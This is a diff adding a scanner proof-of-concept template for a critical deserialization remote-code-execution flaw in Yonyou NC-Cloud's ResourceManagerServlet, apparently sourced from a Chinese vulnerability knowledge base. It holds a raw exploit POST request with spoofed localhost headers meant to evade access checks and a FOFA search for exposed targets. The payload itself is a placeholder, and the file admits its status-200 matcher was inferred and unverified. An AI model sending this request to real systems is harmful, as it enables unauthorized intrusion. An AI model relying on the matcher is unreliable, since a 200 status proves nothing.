@@ -1,0 +1,44 @@
+id: poc-7bb3545fe285426c69d2
+info:
+  name: 用友NC-Clouduap-framework-rc-controller存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7bb3545fe285426c69d279f1742e7969
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7bb3545fe285426c69d279f1742e7969
+    fofa: + fofa`app="用友-NC-Cloud"`
+http:
+- raw:
+  - 'POST /servlet/~uapss/uap.framework.rc.controller.ResourceManagerServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+
+    Content-Length: 335
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    SL-CE-SUID: 126
+
+    X-Forwarded-For: 127.0.0.10
+
+    X-Originating-IP: 127.0.0.10
+
+    X-Remote-Addr: 127.0.0.10
+
+    X-Remote-IP: 127.0.0.10
+
+
+    {{hexd(payload)}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
